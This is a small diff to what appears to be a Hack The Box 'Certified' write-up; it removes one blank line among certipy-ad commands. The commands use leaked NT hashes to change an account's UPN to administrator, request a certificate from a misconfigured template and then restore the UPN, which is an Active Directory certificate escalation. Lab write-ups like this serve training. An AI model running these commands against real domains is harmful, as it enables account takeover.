@@ -70,7 +70,6 @@ Tested on https://app.hackthebox.com/machines/Certified
 ```
 certipy-ad account update -username management_svc@certified.htb -hashes ':a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn administrator
 
-
 certipy-ad req -username ca_operator@certified.htb -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -debug
 
 certipy-ad account update -username management_svc@certified.htb -hashes ':a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn ca_operator@certified.htb
